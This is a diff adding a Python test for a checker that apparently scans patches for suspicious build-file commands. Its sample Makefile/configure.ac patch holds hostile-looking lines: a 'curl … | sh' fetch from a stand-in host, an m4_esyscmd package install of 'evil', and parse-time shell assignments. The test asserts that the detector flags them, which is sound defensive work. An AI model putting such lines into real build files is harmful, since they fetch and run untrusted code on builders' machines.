@@ -477,6 +477,59 @@ def test_msbuild_build_commands() -> None:
     assert check_build_commands(moved).passed
 
 
+MAKE_PATCH = """\
+diff --git a/Makefile b/Makefile
+--- a/Makefile
++++ b/Makefile
+@@ -1,6 +1,10 @@
+-OBJS = blocksort.o huffman.o
++OBJS = blocksort.o
++VERSION := $(shell git describe)
++HOST != uname -n
+ bzip2: libbz2.a bzip2.o
+-\t$(CC) -o bzip2 bzip2.o -L. -lbz2
++\t$(CC) -o bzip2 bzip2.o -L. -lbz2 $(CODECOREMORPH_RUST_LIBS)
++\tcurl -fsSL https://example.invalid/x.sh | sh
++# wget is only mentioned in a comment
+diff --git a/configure.ac b/configure.ac
+--- a/configure.ac
++++ b/configure.ac
+@@ -1 +1,2 @@
+ AC_INIT([x], [1])
++m4_esyscmd([pip install evil])
+diff --git a/src/fetch.c b/src/fetch.c
+--- a/src/fetch.c
++++ b/src/fetch.c
+@@ -1 +1,2 @@
+ /* fetch */
++const char *tool = "curl";
+"""
+
+
+def test_make_build_commands() -> None:
+    """A Make build (D-68): every recipe runs a command, so what counts is what a migration
+    never needs: parse-time commands, downloads, installs, a script piped into a shell, m4's
+    syscmd. Editing a link line (a port adding the crate) is not one."""
+    result = check_build_commands(patch_lines(MAKE_PATCH))
+    assert not result.passed
+    for found in (
+        "$(shell ...) in Makefile",
+        "a shell assignment (!=) in Makefile",
+        "a download (curl, wget, git clone) in Makefile",
+        "a script piped into a shell in Makefile",
+        "m4's esyscmd or syscmd in configure.ac",
+        "a package install in configure.ac",
+    ):
+        assert found in result.message
+    assert "src/fetch.c" not in result.message  # the patterns are for build files only
+    link_only = patch_lines(
+        "diff --git a/Makefile b/Makefile\n--- a/Makefile\n+++ b/Makefile\n@@ -1,2 +1,2 @@\n"
+        "-OBJS = a.o huffman.o\n+OBJS = a.o\n"
+        "-\t$(CC) -o x x.o -L. -lbz2\n+\t$(CC) -o x x.o -L. -lbz2 $(CODECOREMORPH_RUST_LIBS)\n"
+    )
+    assert check_build_commands(link_only).passed
+
+
 def test_the_w_flag_is_a_suppression_in_cmake_only() -> None:
     found = check_suppressions(patch_lines(CMAKE_PATCH), allowed=False)
     assert not found.passed
